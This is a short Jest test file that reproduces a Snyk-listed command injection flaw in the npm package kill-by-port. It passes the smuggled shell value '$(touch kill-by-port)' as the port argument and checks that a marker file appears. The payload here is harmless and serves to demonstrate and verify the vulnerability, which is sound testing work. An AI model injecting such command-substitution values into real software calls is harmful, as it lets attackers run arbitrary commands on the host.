//https://snyk.io/vuln/SNYK-JS-KILLBYPORT-1078531
test("Command Injection in kill-by-port", () => {
  const kill_by_port = require("kill-by-port");
  const fs = require("fs");
  const path = "./kill-by-port";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }

  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  kill_by_port.killByPort("$(touch kill-by-port)");
  sleep.sleep(5);

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, () => {});
});
